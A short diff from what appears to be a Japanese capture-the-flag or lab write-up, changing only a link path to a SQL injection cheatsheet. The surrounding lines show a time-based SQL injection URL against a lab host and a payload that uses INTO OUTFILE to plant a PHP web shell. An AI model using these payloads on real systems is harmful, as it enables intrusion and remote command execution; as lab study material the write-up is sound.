@@ -31,7 +31,7 @@
 http://182.168.137.49:17455/issue/checkByPriority?Priority=High' UNION SELECT SLEEP(5); #
 ```
 
-6. Time-based SQLiがうまくいったので、[SQL Injection](../../Cheatsheet/Common/SQL%20Injection.md#★Webシェルの書き込み（MySQL）)を実行
+6. Time-based SQLiがうまくいったので、[SQL Injection](../Cheatsheet/Common/SQL%20Injection.md#★Webシェルの書き込み（MySQL）)を実行
 ```
 http://182.168.137.49:17455/issue/checkByPriority?Priority=High' UNION SELECT "<?php system($_GET[\"cmd\"]);?>" INTO OUTFILE "/srv/html/webshell.php" #
 ```
